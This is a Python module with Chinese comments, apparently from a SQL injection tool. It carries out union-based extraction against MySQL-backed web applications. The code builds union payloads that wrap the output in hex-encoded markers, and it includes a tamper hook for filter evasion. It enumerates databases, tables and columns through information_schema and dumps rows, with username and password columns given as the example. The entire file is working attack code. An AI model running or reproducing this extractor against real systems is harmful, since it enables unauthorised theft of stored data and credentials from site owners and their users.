# -*- coding: utf-8 -*-
"""union 回显位数据提取：爆库 -> 爆表 -> 爆列 -> 提取数据"""

from .utils import ok, result, warn

MARK = "SQLRES_START", "SQLRES_END"
START, END = MARK


def _q(s):
    """字符串转十六进制避免引号被过滤/转义"""
    return "0x" + s.encode().hex()


def extract(http, point, closure, base, echo_pos, n_cols, subquery):
    """发送 union 查询并解析标记内文本。失败返回 None"""
    slots = []
    placed = False
    for i in range(1, n_cols + 1):
        if i in echo_pos and not placed:
            slots.append(
                f"concat(0x{START.encode().hex()},({subquery}),"
                f"0x{END.encode().hex()})")
            placed = True
        else:
            slots.append(str(i))
    payload = closure.union(base, ",".join(slots))
    text, _ = point.request(http, payload)
    if START not in text or END not in text:
        return None
    body = text.split(START, 1)[1].split(END, 1)[0]
    return body.strip()


class Extractor:
    def __init__(self, http, point, closure, base, echo_pos, cols,
                 tamper=None):
        self.http = http
        self.point = point
        self.cl = closure
        self.base = base
        self.echo = echo_pos
        self.cols = cols
        self.tamper = tamper

    def ask(self, subquery):
        if self.tamper:
            # tamper 应用于完整 payload：这里简化为对子查询应用
            subquery = self.tamper(subquery)
        return extract(self.http, self.point, self.cl, self.base,
                       self.echo, self.cols, subquery)

    def current_db(self):
        v = self.ask("database()")
        if v:
            ok(f"当前数据库: {v}")
            result("database()", v)
        else:
            warn("获取 database() 失败")
        return v

    def all_dbs(self):
        v = self.ask("group_concat(schema_name)")
        if v is None:
            v = self.ask("group_concat(schema_name) from information_schema.schemata")
        if v:
            ok(f"所有数据库: {v}")
        return v

    def tables(self, db):
        v = self.ask(
            f"group_concat(table_name) from information_schema.tables "
            f"where table_schema={_q(db)}")
        if v:
            ok(f"[{db}] 表: {v}")
        return v

    def columns(self, table, db=None):
        where = f"table_name={_q(table)}"
        if db:
            where += f" and table_schema={_q(db)}"
        v = self.ask(
            f"group_concat(column_name) from information_schema.columns "
            f"where {where}")
        if v:
            ok(f"[{table}] 列: {v}")
        return v

    def dump(self, table, columns, db=None, limit=50):
        """columns 形如 'id,username,password'，输出按行分隔便于展示"""
        src = f"{db}.{table}" if db and "." not in table else table
        cols = [c.strip() for c in columns.split(",") if c.strip()]
        if len(cols) > 1:
            inner = ",0x3a,".join(cols)
            sub = (f"group_concat(concat({inner}) separator 0x0a) "
                   f"from {src} limit {limit}")
        else:
            sub = f"group_concat({cols[0]} separator 0x0a) from {src} " \
                  f"limit {limit}"
        return self.ask(sub)
